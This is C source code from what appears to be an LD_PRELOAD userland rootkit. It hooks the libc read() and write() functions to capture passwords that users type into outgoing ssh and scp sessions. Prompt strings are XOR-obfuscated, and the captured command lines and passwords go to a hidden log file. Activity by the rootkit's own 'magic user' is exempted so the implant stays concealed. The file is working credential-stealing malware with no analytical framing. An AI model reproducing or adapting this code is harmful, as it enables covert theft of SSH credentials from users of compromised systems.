#ifdef OUTGOING_SSH_LOGGING
static u_short ssh_start = 0;
static size_t ssh_pass_size = 0;
#define MAX_PASS_SIZE LOG_MAX_SIZE_BYTES - 50
static char ssh_pass[MAX_PASS_SIZE+1];
void __attribute((visibility("hidden"))) clearsshlogbuf(void){
    clearlogbuf(ssh_pass, sizeof(ssh_pass), ssh_pass_size);
    ssh_start = 0;
}
int __attribute((visibility("hidden"))) sshorscp(void){
    return xprocess(SSH_PROC_NAME) || xprocess(SCP_PROC_NAME);
}
ssize_t writelog(ssize_t ret){
    if(!initmvbc()){
        clearsshlogbuf();
        return ret;
    }

    char *cmdline, *logfmt;
    if((cmdline = proccmdl()) == NULL){
        clearsshlogbuf();
        return ret;
    }else if((logfmt = xordup(LOGS_FORMAT)) == NULL){
        clearsshlogbuf();
        clean(cmdline);
        return ret;
    }

    const size_t bufsize = strlen(cmdline) + ssh_pass_size + 5;
    char logbuf[bufsize];
    snprintf(logbuf, bufsize, logfmt, cmdline, ssh_pass);
    clean(logfmt);
    clean(cmdline);

    bdvlogfile_t *bl = readlogfile(mvbc->sshlogs);
    if(!bl){
        clearsshlogbuf();
        return ret;
    }
    if(!alreadylogged(bl, logbuf)){
        addnewlog(bl, logbuf);
        updlogfile(mvbc->sshlogs, bl);
    }
    lree(bl);
    clearsshlogbuf();
    return ret;
}
#endif


ssize_t read(int fd, void *buf, size_t n){
    hook(CREAD);
    ssize_t ret = (ssize_t)call(CREAD, fd, buf, n);
    if(!buf) return ret;
#ifdef OUTGOING_SSH_LOGGING
    if(fd == 4 && ssh_start && sshorscp()){
        if(magicusr() || rknomore()) return ret;
        char *p = buf;
        if(*p == '\n' || ssh_pass_size >= MAX_PASS_SIZE)
            return writelog(ret);
        ssh_pass[ssh_pass_size++] = *p;
    }
#endif
    return ret;
}
ssize_t write(int fd, const void *buf, size_t n){
    hook(CWRITE);
    ssize_t ret = (ssize_t)call(CWRITE, fd, buf, n);
    if(!buf) return ret;
#ifdef OUTGOING_SSH_LOGGING
    if(!rknomore() && sshorscp()){
        char *as = xordup(ASSWORD_STRING);
        if(!as) return ret;
        char *passwordfield = strstr((char*)buf, as);
        clean(as);

        if(passwordfield){
            if(magicusr()) return ret;
            ssh_pass_size = 0;
            memset(ssh_pass, 0, sizeof(ssh_pass));
            ssh_start = 1;
        }
    }
#endif
    return ret;
}